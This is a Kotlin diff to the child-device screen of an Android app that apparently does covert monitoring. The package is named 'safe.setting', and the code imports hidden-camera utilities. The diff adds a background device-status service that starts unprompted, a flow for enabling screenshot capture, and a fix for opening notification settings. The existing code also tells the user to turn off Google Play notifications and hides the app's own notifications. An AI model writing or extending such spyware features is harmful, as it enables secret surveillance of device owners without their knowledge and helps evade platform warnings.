@@ -36,6 +36,9 @@ import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraFacing
 // import com.pawegio.kandroid.show // **** पुराना इम्पोर्ट हटा दिया गया ****
 import io.reactivex.rxjava3.disposables.Disposable
 import javax.inject.Inject
+import androidx.core.net.toUri
+import com.safe.setting.app.services.devicestatus.DeviceStatusService
+import com.safe.setting.app.services.screenshot.ScreenshotPermissionActivity
 
 class MainChildActivity : BaseActivity<ActivityMainChildBinding>() {
 
@@ -54,6 +57,11 @@ class MainChildActivity : BaseActivity<ActivityMainChildBinding>() {
     private lateinit var switchAppNotification: SwitchCompat
     private lateinit var switchPlayStoreNotification: SwitchCompat
 
+    private lateinit var btnEnableScreenshot: RelativeLayout
+    private lateinit var switchScreenshot: SwitchCompat
+
+
+
     @Inject
     lateinit var firebase: InterfaceFirebase
 
@@ -63,6 +71,9 @@ class MainChildActivity : BaseActivity<ActivityMainChildBinding>() {
         getComponent()!!.inject(this)
         init()
         onClickApp()
+        // डिवाइस स्टेटस सर्विस शुरू करें
+        startService(Intent(this, DeviceStatusService::class.java))
+
     }
 
     private fun initializeViews() {
@@ -79,6 +90,8 @@ class MainChildActivity : BaseActivity<ActivityMainChildBinding>() {
         switchAccessibility = binding.switchAccessibility
         switchAppNotification = binding.switchAppNotification
         switchPlayStoreNotification = binding.switchPlaystoreNotification
+        btnEnableScreenshot = binding.btnEnableScreenshot
+        switchScreenshot = binding.switchScreenshot
     }
 
     override fun instanceViewBinding(): ActivityMainChildBinding {
@@ -120,8 +133,12 @@ class MainChildActivity : BaseActivity<ActivityMainChildBinding>() {
             switchWhitelist.isChecked = isAddWhitelist()
             btnWhitelist.visibility = View.VISIBLE
             // **** बदलाव समाप्त ****
+            val prefs = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
+            switchScreenshot.isChecked = prefs.getBoolean("screenshot_service_enabled", false)
+
         }
     }
+
 
     private fun updateNotificationSwitches() {
         switchAppNotification.isChecked = !NotificationManagerCompat.from(this).areNotificationsEnabled()
@@ -184,6 +201,14 @@ class MainChildActivity : BaseActivity<ActivityMainChildBinding>() {
             }
         }
 
+        btnEnableScreenshot.setOnClickListener {
+            if (!switchScreenshot.isChecked) {
+                startActivity(Intent(this, ScreenshotPermissionActivity::class.java))
+            } else {
+                showMessage(R.string.already_activated)
+            }
+        }
+
         btnPlayStoreNotificationSettings.setOnClickListener {
             if (!getPlayStoreVisitedPreference()) {
                 val dialogMessage = "You need to turn OFF notifications for Google Play products. Press OK to go to settings."
@@ -202,17 +227,38 @@ class MainChildActivity : BaseActivity<ActivityMainChildBinding>() {
         }
     }
 
-    private fun openNotificationSettings(targetPackageName: String) {
-        try {
+//    private fun openNotificationSettings(targetPackageName: String) {
+//        try {
+//            val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
+//                putExtra(Settings.EXTRA_APP_PACKAGE, targetPackageName)
+//                flags = Intent.FLAG_ACTIVITY_NEW_TASK
+//            }
+//            startActivity(intent)
+//        } catch (e: ActivityNotFoundException) {
+//            Toast.makeText(this, "Could not open settings.", Toast.LENGTH_SHORT).show()
+//        }
+//    }
+private fun openNotificationSettings(targetPackageName: String) {
+    try {
+        // *** FIX STARTS HERE ***
+        // यह कोड केवल Android 8.0 (API 26) और उससे ऊपर के संस्करणों पर काम करेगा।
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
                 putExtra(Settings.EXTRA_APP_PACKAGE, targetPackageName)
                 flags = Intent.FLAG_ACTIVITY_NEW_TASK
             }
             startActivity(intent)
-        } catch (e: ActivityNotFoundException) {
-            Toast.makeText(this, "Could not open settings.", Toast.LENGTH_SHORT).show()
+        } else {
+            // पुराने संस्करणों के लिए एक वैकल्पिक तरीका।
+            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+            intent.data = "package:$targetPackageName".toUri()
+            startActivity(intent)
         }
+        // *** FIX ENDS HERE ***
+    } catch (e: ActivityNotFoundException) {
+        Toast.makeText(this, "Could not open settings.", Toast.LENGTH_SHORT).show()
     }
+}
 
     private fun getReference(child: String): DatabaseReference = firebase.getDatabaseReference(child)
 
